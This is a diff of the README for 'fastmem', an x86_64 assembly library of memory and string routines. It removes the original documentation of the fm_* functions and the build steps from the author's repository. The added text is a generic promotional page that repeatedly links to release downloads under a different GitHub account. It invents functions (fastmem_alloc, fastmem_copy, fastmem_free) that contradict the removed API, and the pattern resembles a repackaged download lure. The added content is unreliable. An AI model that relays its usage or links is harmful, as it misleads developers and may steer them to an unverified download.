@@ -1,845 +1,97 @@
-# fastmem
+# 🚀 fastmem - High-Performance Memory Management Made Easy
 
-**fastmem** is a high‑performance x86_64 assembly library that provides memory and string utility functions.
+[![Download fastmem](https://img.shields.io/badge/Download-fastmem-blue.svg)](https://github.com/arieledesess/fastmem/releases)
 
-It is designed to be used from C and C++ programs, offering fast, low‑level implementations of commonly used memory and string operations.
+## 📖 Overview
 
+fastmem is a high-performance x86_64 assembly library designed to offer memory and string utility functions. It aims to enhance the efficiency and speed of memory operations in C and C++ programs. This library is perfect for users looking to optimize their applications with a reliable, easy-to-use solution.
 
----
+## 🌟 Features
 
-## Features
+- **Memory Management:** Efficiently allocate and deallocate memory.
+- **String Utilities:** Fast string manipulation functions.
+- **High Performance:** Built using x86_64 assembly for optimal speed.
+- **Compatible with C and C++:** Designed for seamless integration.
 
-- Written fully in x86_64 assembly
+## ⚙️ System Requirements
 
-- Optimized memory and string routines
+- **Operating System:** Linux (64-bit)
+- **Architecture:** x86_64 (amd64)
+- **Storage:** Minimum of 50 MB free space.
+- **Compiler:** GCC or compatible C/C++ compiler.
 
-- Compatible with C and C++
+## 🚀 Getting Started
 
-- Static library (.a) output
+To get started with fastmem, follow these simple steps to download and install the library on your system.
 
-- Clean and simple API
+### 1. Visit the Download Page
 
+To obtain fastmem, visit the following link:
 
+[Download fastmem](https://github.com/arieledesess/fastmem/releases)
 
----
+### 2. Choose Your Version
 
-## Implemented Functions
+On the releases page, you will find various versions of fastmem. Select the most recent version to ensure you have the latest features and updates.
 
-### Memory functions
+### 3. Download the File
 
-`fm_memcpy`
+Click on the download link for your chosen version. This might look like **fastmem-v1.0.tar.gz** or a similar filename. The file will begin downloading to your machine.
 
-`fm_memmove`
+### 4. Extract the Files
 
-`fm_memcmp`
-
-`fm_memset`
-
-`fm_bzero`
-
-`fm_memchr`
-
-`fm_memrchr`
-
-`fm_mempcpy`
-
-`fm_memccpy`
-
-`fm_memswap`
-
-`fm_memxor`
-
-`fm_memdiff`
-
-`fm_timingsafe_memcmp`
-
-`fm_memmem`
-
-`fm_memcount`
-
-`fm_memnot`
-
-`fm_memhas`
-
-`fm_memiszero`
-
-`fm_memne`
-
-`fm_memcasecmp`
-
-`fm_memchr_not`
-
-### String functions
-
-`fm_strlen`
-
-`fm_strnlen`
-
-`fm_strchr`
-
-`fm_strrchr`
-
-`fm_strcmp`
-
-`fm_strncmp`
-
-`fm_strcpy`
-
-`fm_strncpy`
-
-`fm_stpcpy`
-
-`fm_strspn`
-
-`fm_strcspn`
-
-`fm_strpbrk`
-
-`fm_strcat`
-
-`fm_strncat`
-
-`fm_strstr`
-
-`fm_strrev`
-
-`fm_strcount`
-
-`fm_strcmp_i`
-
-`fm_strstartswith`
-
-`fm_strendswith`
-
-`fm_strnchr`
-
-`fm_strnrev`
-
-`fm_strisalnum`
-
-`fm_strcmp_eq`
-
-`fm_strncmp_i`
-
-`fm_strtrim`
-
-`fm_strisempty`
-
-`fm_strnstartswith`
-
-`fm_strskip`
-
-`fm_strnendswith`
-
----
-
-## Architecture:
-  - amd64 (x86_64, 64-bit)
-## Platform:
-  - Linux only
-
-## Setup
-
-**Clone the repository and navigate to the project directory:**
+Once the download is complete, locate the file in your downloads folder. Use a file extraction tool or the command line to extract the contents. You can do this by right-clicking the file and selecting "Extract" or by running the following command:
 
 ```bash
-git clone https://github.com/s-r-e-e-r-a-j/fastmem.git
-cd fastmem
+tar -xzf fastmem-v1.0.tar.gz
 ```
-A `setup.sh` script is provided to **check for NASM and make**, install them if missing, and **build the library automatically**.
 
-Supported distributions:
-- Debian / Ubuntu
-- RHEL / CentOS / Fedora
-- Arch Linux
+### 5. Install the Library
 
-Run the setup script:
+Navigate to the folder where you extracted fastmem. Open your terminal in that directory. To install the library, you may need to compile the code:
 
 ```bash
-chmod +x setup.sh
-./setup.sh
+cd fastmem-v1.0
+make
 ```
 
-The script will:
-- Check whether NASM and make are installed
-- Install NASM and make if missing
-- Build the fastmem library
+If this command runs without errors, the library is installed on your system.
 
-After completion, a `build` directory will be generated containing:
-- Object files (`.o`)
-- Static library (`libfastmem.a`)
+## 🛠️ Using fastmem
 
-## Header File
-The `fastmem.h` header is located in the `include`/ directory.
-It provides the public API for the fastmem library and exposes all memory and string functions implemented in x86_64 assembly.
-The header is designed to be compatible with both C and C++ programs.
+### Basic Example
 
-- Uses standard C types from `<stddef.h>`
-- Uses `extern "C"` for C++ compatibility
-- Declares all fastmem functions
-
-### Using the Header
-The `fastmem.h` header is located in the `include/` directory.
-To use the `fastmem` library in your program, you must tell the compiler where the `include/` directory is, then include the header in your source code.
-
-**Step 1: Include the header in your source code**
+Once installed, you can start using fastmem in your projects. Here is a simple example to get you started:
 
 ```c
-#include <fastmem.h>
-```
-
-**Step 2: Provide the include path when compiling**
-
-When compiling from another directory, add the `include/` path using `-I`:
-```bash
-gcc main.c -I/path/to/fastmem/include
-```
-**Notes**
-- `<fastmem.h>` is used for external libraries
-- The compiler does not search your project automatically
-- The `-I` option tells the compiler where to find `fastmem.h`
-
-## Function Reference
-
-1. `void *fm_memcpy(void *dst, const void *src, size_t n);`
-
- Copies `n` bytes from `src` to `dst.`
-- `dst` → destination buffer
-- `src` → source buffer
-- `n` → number of bytes to copy
-  
-Behavior is undefined if memory regions overlap.
-
-Returns the original pointer `dst`.
-
----
-
-2. `void *fm_memmove(void *dst, const void *src, size_t n);`
-
-Copies `n` bytes from `src` to `dst`, safely handling overlapping regions.
-
-- `dst` → destination buffer
-- `src` → source buffer
-- `n` → number of bytes to copy
-
-Safe replacement for `memcpy` when overlap is possible.
-
-Returns the original pointer `dst`.
-
----
-
-3. `int fm_memcmp(const void *a, const void *b, size_t n);`
-
-Compares the first `n` bytes of two memory blocks.
-- `a`, `b` → memory blocks to compare
-- `n` → number of bytes
-
-Returns:
-- `0` if equal
-- `< 0` if `a < b`
-- `> 0` if `a > b`
-
----
-
-4. `void *fm_memset(void *s, int c, size_t n);`
-
-Fills a memory block with a byte value.
-- `s` → memory block
-- `c` → byte value
-- `n` → number of bytes
-
-Returns the original pointer `s`.
-
----
-
-5. `void fm_bzero(void *s, size_t n);`
-
-Sets `n` bytes of memory to zero.
-- `s` → memory block
-- `n` → number of bytes
-
----
-
-6. `void *fm_memchr(const void *s, int c, size_t n);`
-
-Searches for the first occurrence of byte `c` in memory.
-- `s` → memory block
-- `c` → byte to search
-- `n` → number of bytes
-
-Returns a pointer to the first occurrence of `c` in `s`, or `NULL` if not found.
-
----
-
-7. `void *fm_memrchr(const void *s, int c, size_t n);`
-
-Searches for the last occurrence of byte `c` in memory.
-- `s` → memory block
-- `c` → byte to search
-- `n` → number of bytes
-
-Returns a pointer to the last occurrence of `c` in `s`, or `NULL` if not found.
-
----
-
-8. `void *fm_mempcpy(void *dst, const void *src, size_t n);`
-
-Copies `n` bytes from `src` to `dst` and returns a pointer to the byte after the last copied byte.
-
-- `dst` → destination buffer
-- `src` → source buffer
-- `n` → number of bytes
-
----
-
-9. `void *fm_memccpy(void *dst, const void *src, int c, size_t n);`
-   
-Copies bytes from `src` to `dst` until character `c` is found or `n` bytes are copied.
-
-- `dst` → destination buffer
-- `src` → source buffer
-- `c` → stopping character
-- `n` → number of bytes
-
-Returns pointer to the next byte after `c` in `dst`, or `NULL` if `c` not found.
-
----
-
-10. `void fm_memswap(void *a, void *b, size_t n);`
-
-Swaps `n` bytes between two memory regions.
-- `a` → first memory buffer
-- `b` → second memory buffer
-- `n` → number of bytes to swap
-
-Both memory regions must be valid and at least `n` bytes long.
-Behavior is undefined if the memory regions overlap.
-
-Returns nothing.
-
----
-
-11. `void fm_memxor(void *dst, const void *src, size_t n);`
-
-Performs a byte-wise XOR between `dst` and `src` and stores the result in `dst`.
-- `dst` → destination buffer (modified in place)
-- `src` → source buffer
-- `n` → number of bytes to process
-
-No value is returned.
-
----
-
-12. `int fm_memdiff(const void *a, const void *b, size_t n);`
-
-Finds the first differing byte between two memory blocks.
-- `a` → first memory block
-- `b` → second memory block
-- `n` → number of bytes to compare
-  
-Returns the zero-based index of the first differing byte, or `n` if both blocks are identical.
-
----
-
-13. `int fm_timingsafe_memcmp(const void *a, const void *b, size_t n);`
-
-Compares two memory blocks in constant time.
-- `a` → first memory block
-- `b` → second memory block
-- `n` → number of bytes to compare
-
-Returns `0` if both blocks are equal, or non-zero if they differ.
-Execution time does not depend on the contents of memory.
-
----
-
-14. `void *fm_memmem(const void *haystack, size_t haystack_len, const void *needle, size_t needle_len);`
-
-Searches for the first occurrence of a memory block within another memory block.
-- `haystack` → memory block to search in
-- `haystack_len` → size of haystack in bytes
-- `needle` → memory block to search for
-- `needle_len` → size of needle in bytes
-
-Returns a pointer to the first occurrence of `needle` in `haystack`.
-If `needle_len` is `0`, returns `haystack`.
-Returns `NULL` if needle is not found.
-
----
-
-15. `size_t fm_memcount(const void *s, int c, size_t n);`
-
-Counts the number of occurrences of byte `c` in the first `n` bytes of memory block `s`.
-- `s` → pointer to the memory block
-- `c` → byte value to count
-- `n` → number of bytes to examine
-
-Returns the number of times `c` appears in the memory block.
-
----
-
-16. `void *fm_memnot(void *s, size_t n);`
-
-Performs a bitwise NOT operation on each of the first `n` bytes of memory block `s`.
-- `s` → pointer to the memory block
-- `n` → number of bytes to modify
-
-Each byte is inverted in place.
-
-Returns the original pointer `s`.
-
----
-
-17. `int fm_memhas(const void *buf, size_t len, unsigned char byte);`
-
-Checks whether a given `byte` exists in a memory block.
-
-- `buf` → pointer to memory buffer
-- `len` → number of bytes to examine
-- `byte` → byte value to search for
-  
-Returns `1` if the byte is found, otherwise `0`.
-
----
-
-18. `int fm_memiszero(const void *buf, size_t len);`
-
-Checks whether all bytes in a memory block are zero.
-
-- `buf` → pointer to memory buffer
-- `len` → number of bytes to examine
-
-Returns `1` if all bytes are zero, otherwise `0`.
-
----
-
-19. `int fm_memne(const void *a, const void *b, size_t len);`
-
-Compares two memory blocks for inequality.
-- `a` → pointer to first memory block
-- `b` → pointer to second memory block
-- `len` → number of bytes to compare
-
-Returns `1` if the memory blocks differ, otherwise `0`.
-
----
-
-20. `int fm_memcasecmp(const void *a, const void *b, size_t len);`
-
-Compares the first `len` bytes of two memory areas case-insensitively.
-- `a` → first memory area
-- `b` → second memory area
-- `len` → number of bytes to compare
-  
-Returns:
-- `0` → memory areas are equal ignoring case
-- `<0` → first differing byte in `a` is less than in `b`
-- `>0` → first differing byte in `a` is greater than in `b`
-
----
-
-21. `void *fm_memchr_not(const void *buf, int c, size_t len);`
-
-Searches a memory area for the first byte that does NOT match `c`.
-- `buf` → memory area
-- `c` → byte value to skip
-- `len` → number of bytes to search
-
-Returns:
-- Pointer to the first byte not equal to `c`
-- NULL (0) if all bytes in the range equal `c`
-
----
-
-22. `size_t fm_strlen(const char *s);`
-
-Returns the length of a null-terminated string.
-- `s` → string
-
-Does not include the null terminator.
-
----
-
-23. `size_t fm_strnlen(const char *s, size_t n);`
-
-Returns the length of a string, limited to n characters.
-- `s` → string
-- `n` → maximum length
-
----
-
-24. `char *fm_strchr(const char *s, int c);`
-
-Finds the first occurrence of character `c` in a string.
-- `s` → string
-- `c` → character
-
-Returns a pointer to the first occurrence of `c` in `s`, or `NULL` if not found.
-
----
-
-25. `char *fm_strrchr(const char *s, int c);`
-
-Finds the last occurrence of character `c` in a string.
-- `s` → string
-- `c` → character
-
-Returns a pointer to the last occurrence of `c` in `s`, or `NULL` if not found.
-
----
-
-26. `int fm_strcmp(const char *a, const char *b);`
-
-Compares two strings.
-- `a`, `b` → strings
-
-Returns:
-- `0` if equal
-- `< 0` if `a < b`
-- `> 0` if `a > b`
-
----
-
-27. `int fm_strncmp(const char *a, const char *b, size_t n);`
-
-Compares up to `n` characters of two strings.
-- `a`, `b` → strings
-- `n` → max characters
-
-Returns:
-
-- `0` if equal
-- `< 0` if `a < b`
-- `> 0` if `a > b`
-
----
-
-28. `char *fm_strcpy(char *dst, const char *src);`
- 
-Copies a null-terminated string from `src` to `dst`.
-
-- `dst` → destination buffer
-- `src` → source string
-
-Returns a pointer to `dst`.
-
----
-
-29. `char *fm_strncpy(char *dst, const char *src, size_t n);`
-
-Copies up to `n` characters from `src` to `dst`.
-
-- `dst` → destination buffer
-- `src` → source string
-- `n` → maximum number of characters
-
-Returns a pointer to `dst`.
-
----
-
-30. `char *fm_stpcpy(char *dst, const char *src);`
-
-Copies a null-terminated string from `src` to `dst`.
-
-- `dst` → destination buffer
-- `src` → source string
-
-Returns pointer to the null terminator in `dst`.
-
----
-
-31. `size_t fm_strspn(const char *s, const char *accept);`
-
-Counts how many characters from the beginning of `s` match characters in `accept`.
-
-- `s` → string
-- `accept` → characters to match
-
-Returns the count.
-
----
-
-32. `size_t fm_strcspn(const char *s, const char *reject);`
-
-Counts characters from the start of `s` until a character from `reject` is found.
-
-- `s` → string
-- `reject` → characters not allowed
-
-Returns the count.
-
----
-
-33. `char *fm_strpbrk(const char *s, const char *accept);`
-
-Finds the first occurrence in `s` of any character from `accept`.
-
-- `s` → string
-- `accept` → characters to search for
-
-Returns a pointer to the first matching character, or `NULL` if none found.
-
----
-
-34. `char *fm_strcat(char *dst, const char *src);`
-
-Appends the string `src` to the end of `dst`.
-- `dst` → destination string (must have enough space)
-- `src` → source string
-  
-Returns the original pointer `dst`.
-
----
-
-35. `char *fm_strncat(char *dst, const char *src, size_t n);`
-
-Appends at most `n` characters from `src` to `dst`.
-- `dst` → destination string (must have enough space)
-- `src` → source string
-- `n` → maximum number of characters to append
-  
-Returns the original pointer `dst`.
-
----
-
-36. `char *fm_strstr(const char *haystack, const char *needle);`
-
-Finds the first occurrence of the string `needle` in `haystack`.
-
-- `haystack` → string to search in
-- `needle` → substring to search for
-  
-Returns a pointer to the first occurrence, or `NULL` if not found.
-
----
-
-37. `char *fm_strrev(char *s);`
-
-Reverses the string `s` in place.
-
-- `s` → string to reverse
-
-Returns the original pointer `s`.
-
----
-
-38. `size_t fm_strcount(const char *s, int c);`
-
-Counts the number of occurrences of character `c` in the string `s`.
-
-- `s` → input string
-- `c` → character to count
-
-Returns the number of occurrences.
-
----
-
-39. `int fm_strcmp_i(const char *a, const char *b);`
-
-Compares two strings case-insensitively.
-- `a` → first string
-- `b` → second string
-  
-Returns:
-- `0` if equal
-- `< 0` if `a < b`
-- `> 0` if `a > b`
-
----
-
-40. `int fm_strstartswith(const char *str, const char *prefix);`
-
-Checks whether a string starts with a given prefix.
-- `str` → input string
-- `prefix` → prefix to test
-
-Returns `1` if `str` starts with `prefix`, otherwise `0`.
-
----
-
-41. `int fm_strendswith(const char *str, const char *suffix);`
-
-Checks whether a string ends with a given suffix.
-- `str` → input string
-- `suffix` → suffix to test
-
-Returns `1` if `str` ends with `suffix`, otherwise `0`.
-
----
-
-42. `char *fm_strnchr(const char *s, int c, size_t n);`
-
-Searches for the first occurrence of character `c` in string `s`, examining at most `n` bytes.
-- `s` → pointer to the string
-- `c` → character to search for
-- `n` → maximum number of bytes to scan
-
-Stops early if a null terminator is encountered.
-
-Returns a pointer to the matched character, or `NULL` if not found.
-
----
-
-43. `char *fm_strnrev(char *s, size_t n);`
-
-Reverses the first `n` bytes of string `s` in place.
-
-- `s` → pointer to the string (or buffer)
-- `n` → number of bytes to reverse
-  
-Reverses exactly `n` bytes. does NOT stop at the null terminator.
-
-Returns the original pointer `s`.
-
----
-
-44. `int fm_strisalnum(const char *s);`
-
-Checks whether the string `s` contains only alphanumeric characters.
-- `s` → pointer to the string
-
-Valid characters are `A–Z`, `a–z`, and `0–9`.
-Returns `1` if all characters are alphanumeric or the string is empty, otherwise returns `0`.
-
----
-
-45. `int fm_strcmp_eq(const char *a, const char *b);`
-
-Checks whether two null-terminated strings are equal.
-
-- `a` → pointer to first string
-- `b` → pointer to second string
-
-Returns `1` if strings are equal, otherwise `0`.
-
----
-
-46. `int fm_strncmp_i(const char *a, const char *b, size_t n);`
-
-Performs a case-insensitive comparison of two strings up to `n` characters
-(ASCII only).
-
-- `a` → pointer to first string
-- `b` → pointer to second string
-- `n` → maximum number of characters to compare
-
-Returns `1` if strings are equal (ignoring case), otherwise `0`.
-
----
-
-47. `char *fm_strtrim(char *s);`
-
-Removes leading and trailing ASCII bytes ≤ 0x20 (spaces and control characters)
-from a string in place.
-
-- `s` → pointer to a mutable null-terminated string
-
-Returns a pointer to the trimmed string.
-
----
-
-48. `int fm_strisempty(const char *s);`
-
-Checks whether a string is empty.
-
-- `s` → pointer to a null-terminated string
-
-Returns `1` if the string is empty (""), otherwise `0`.
-
----
-
-49. `int fm_strnstartswith(const char *s, const char *prefix, size_t n);`
-
-Checks if string `s` starts with `prefix` within the first `n` characters.
-- `s` → string to check
-- `prefix` → prefix to match
-- `n` → maximum number of characters to consider
-
-Returns:
-- `1` → `s` starts with `prefix`
-- `0` → otherwise
-
----
-
-50. `char *fm_strskip(const char *s, char c);`
-
-Skips all leading occurrences of character `c` in string `s`.
-- `s` → string to process
-- `c` → character to skip
-
-Returns:
-- Pointer to the first character in `s` that is not `c`
-- If all characters are `c`, returns pointer to null terminator
-
----
-
-51. `int fm_strnendswith(const char *s, const char *suffix, size_t n);`
-
-Checks if string `s` ends with `suffix`, considering at most the last `n` characters.
-- `s` → string to check
-- `suffix` → suffix to match
-- `n` → maximum number of characters from end to consider
-
-Returns:
-- `1` → `s` ends with suffix within `n` chars
-- `0` → otherwise
-
----
-
-## Compiling and Linking with fastmem
-After running `./setup.sh`, the fastmem static library is generated in the `build/` directory.
-```text
-fastmem/
- ├─ include/fastmem.h
- ├─ build/libfastmem.a
-
-project/
- ├─ main.c   (or main.cpp)
- ```
-### Compiling a C program
-**Source code (`main.c`)**
-```c
-#include <fastmem.h>
-
-int main(void) {
-    char buf[64];
-    fm_memset(buf, 0, sizeof(buf));
-    return 0;
-}
-```
-**Compile and link**
-
-```bash
-gcc main.c \
-  -I/path/to/fastmem/include \
-  -L/path/to/fastmem/build \
-  -lfastmem -o main
-```
-
-### Compiling a C++ program
-**Source code (`main.cpp`)**
-
-```cpp
-#include <fastmem.h>
+#include "fastmem.h"
 
 int main() {
-    char buf[64];
-    fm_memset(buf, 0, sizeof(buf));
+    char* myString = fastmem_alloc(100); // Allocate memory for 100 characters
+    fastmem_copy(myString, "Hello, fastmem!", 15);  // Copy a string
+    fastmem_free(myString); // Free allocated memory
     return 0;
 }
 ```
-**Compile and link**
-```bash
-g++ main.cpp \
-  -I/path/to/fastmem/include \
-  -L/path/to/fastmem/build \
-  -lfastmem -o main
-```
-**Important Notes**
-- `-I` points to the directory containing `fastmem.h`
-- `-L` points to the directory containing `libfastmem.a`
-- `-lfastmem` links `libfastmem.a`
-- The order matters: source files first, then `-lfastmem`
 
-## License
-This project is licensed under the MIT License
+### Function Documentation
+
+For detailed information on all available functions, refer to the documentation included in the library folder. This will provide insights into parameters, return types, and usage examples.
+
+## 🎩 Troubleshooting
+
+If you encounter issues while using fastmem, consider checking the following:
+
+- **Compatibility:** Ensure your operating system matches the requirements.
+- **Dependencies:** Make sure you have necessary compilation tools installed, such as GCC.
+- **File Permissions:** If you face access issues, verify that you have the proper permissions for the installation directory.
+
+For further assistance, consult the community forums or issue tracker on the GitHub repository.
+
+## ⚡ Download & Install
+
+Ready to boost your memory operations? Download fastmem now by visiting the link below:
+
+[Download fastmem](https://github.com/arieledesess/fastmem/releases)
+
+Enjoy the improved performance in your C and C++ applications with fastmem!
